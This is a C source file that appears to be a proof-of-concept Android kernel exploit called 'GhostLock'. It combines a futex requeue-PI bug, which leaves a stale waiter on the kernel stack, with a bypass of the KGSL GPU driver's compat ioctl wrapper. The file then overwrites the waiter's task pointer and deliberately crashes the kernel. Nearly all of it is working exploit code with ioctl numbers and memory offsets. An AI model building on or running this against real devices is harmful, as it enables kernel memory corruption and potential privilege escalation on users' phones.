/**
 * ghostlock_final.c — END-TO-END: GhostLock + KGSL Bypass + CFU Trigger
 *
 * Strategy:
 * 1. Trigger GhostLock (FUTEX_CMP_REQUEUE_PI) → stale waiter on kernel stack
 * 2. Create GPU context (flags=0x12)
 * 3. Bypass compat wrapper by sending native SUBMIT_COMMANDS (0xc038093d)
 * 4. Regular handler is called from 32-bit process (TIF_32BIT set)
 * 5. add_ibdesc_list uses 16B CFU @ SP+0x28
 * 6. CFU overwrites stale waiter's TASK pointer with crash pattern
 * 7. When PI chain walk dereferences fake TASK → KERNEL CRASH (success!)
 *
 * WARNING: Running this WILL crash the kernel if CFU works correctly.
 * Device must be rebooted after successful test.
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

/* ── GhostLock ──────────────────────────────────────────────────── */
static uint32_t f_wait      __attribute__((aligned(4096)));
static uint32_t f_pi_target __attribute__((aligned(4096)));
static uint32_t f_pi_chain  __attribute__((aligned(4096)));
static volatile int ready, owner_ok, kgsl_done;

static long futex(uint32_t *u, int op, uint32_t val, void *to, uint32_t *u2, uint32_t v3) {
    return syscall(SYS_futex, u, op, val, to, u2, v3);
}

/* ── Waiter thread ──────────────────────────────────────────────── */
static void *waiter(void *a) {
    (void)a;

    /* Phase 1: Enter PI chain */
    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[waiter] pi_chain locked\n");
    ready = 1;
    while (!owner_ok) usleep(1000);

    /* Phase 2: FUTEX_WAIT_REQUEUE_PI — leaves stale waiter on our stack */
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 8;
    long r = futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
    printf("[waiter] WAIT_REQUEUE_PI: ret=%ld errno=%d\n", r, errno);
    printf("[waiter] ⚠️  Stale rt_mutex_waiter now on kernel stack at ~SP+0x50!\n");

    /* Phase 3: KGSL bypass — CFU overwrites stale waiter */
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    printf("[kgsl] fd=%d\n", fd);

    /* Create context */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    r = ioctl(fd, 0xc0080913, &ctx);
    printf("[kgsl] CREATE(0x12): ret=%d id=%u\n", (int)r, ctx.id);
    if (r < 0) goto out;

    /* Build ibdesc — the CFU payload
     * ibdesc[0:8]  → waiter+0x28 (pi_tree.rb_left) = 0x0 (safe)
     * ibdesc[8:16] → waiter+0x30 (TASK pointer) = CRASH PATTERN
     */
    struct __attribute__((aligned(16))) {
        uint64_t gpuaddr;
        uint64_t sizedwords;
    } ibdesc = {
        0x0000000000000000ULL,          /* → pi_tree.rb_left = NULL (safe) */
        0x4141414141414141ULL           /* → task = 0x4141... (INVALID!) */
    };

    /* Build SUBMIT_COMMANDS struct (56 bytes, native format)
     * Using offset layout that succeeded in test_offset_scan */
    uint8_t sbuf[56];
    memset(sbuf, 0, 56);
    *(uint32_t*)(sbuf+0x00) = ctx.id;
    /* cmdlist ptr at +0x10, size at +0x18, num at +0x1c — proven working */
    *(uint64_t*)(sbuf+0x10) = (uint64_t)(uintptr_t)&ibdesc;
    *(uint32_t*)(sbuf+0x18) = 16;  /* cmdlist_size = 1 ibdesc */
    *(uint32_t*)(sbuf+0x1c) = 1;   /* numcmds */

    printf("\n[kgsl] ╔══════════════════════════════════╗\n");
    printf("[kgsl] ║  FIRING CFU WITH CRASH PATTERN  ║\n");
    printf("[kgsl] ║  ibdesc.ga=0x%016llx           ║\n", (unsigned long long)ibdesc.gpuaddr);
    printf("[kgsl] ║  ibdesc.sw=0x%016llx           ║\n", (unsigned long long)ibdesc.sizedwords);
    printf("[kgsl] ║  KERNEL WILL CRASH IF CFU OK   ║\n");
    printf("[kgsl] ╚══════════════════════════════════╝\n\n");

    /* Bypass compat wrapper: 0xc038093d != compat[0x3d] (0xc02c093d)
     * → falls through to regular handler → CFU via TIF_32BIT 16B path */
    errno = 0;
    r = ioctl(fd, 0xc038093d, sbuf);
    printf("[kgsl] SUBMIT: ret=%d errno=%d (%s)\n",
           (int)r, errno, r < 0 ? strerror(errno) : "OK");
    if (r == 0) {
        printf("[kgsl] ⚠️⚠️⚠️  CFU EXECUTED SUCCESSFULLY! ⚠️⚠️⚠️\n");
        printf("[kgsl] If you see this, kernel somehow survived...\n");
    }

    ioctl(fd, 0x40040914, &ctx.id);
out:
    close(fd);
    futex(&f_pi_chain, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
    kgsl_done = 1;
    return 0;
}

/* ── Owner thread ───────────────────────────────────────────────── */
static void *owner(void *a) {
    (void)a;
    futex(&f_pi_target, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_target locked\n");
    owner_ok = 1;
    while (!ready) usleep(1000);
    usleep(500000); /* Let waiter enter FUTEX_WAIT_REQUEUE_PI */

    futex(&f_pi_chain, FUTEX_LOCK_PI, 0, 0, 0, 0);
    printf("[owner] pi_chain locked (PI chain formed)\n");
    while (!kgsl_done) sleep(1);
    return 0;
}

/* ── Main ────────────────────────────────────────────────────────── */
int main(void) {
    printf("╔══════════════════════════════════════════╗\n");
    printf("║  GhostLock + KGSL CFU — END TO END     ║\n");
    printf("║  ⚠️  KERNEL CRASH = SUCCESS!           ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    f_wait = 0;
    f_pi_target = 0;
    f_pi_chain = 0;

    pthread_t wt, ot;
    pthread_create(&wt, 0, waiter, 0);
    usleep(200000); /* Let waiter lock pi_chain and enter FUTEX_WAIT_REQUEUE_PI */
    pthread_create(&ot, 0, owner, 0);
    usleep(300000); /* Let owner lock pi_target */

    /* Phase 4: GhostLock trigger */
    printf("[trigger] FUTEX_CMP_REQUEUE_PI...\n");
    int triggered = 0;
    for (int i = 0; i < 100; i++) {
        long r = futex(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);
        if (r >= 0) {
            printf("[trigger] ✅ GhostLock! ret=%ld (attempt %d)\n\n", r, i);
            triggered = 1;
            break;
        }
        usleep(1000);
    }
    if (!triggered) printf("[trigger] ❌ Failed\n");

    /* Wait for KGSL phase to complete (or kernel to crash) */
    sleep(2);
    while (!kgsl_done) sleep(1);

    pthread_join(wt, 0);
    pthread_join(ot, 0);
    printf("\n=== KERNEL SURVIVED ===\n");
    return 0;
}
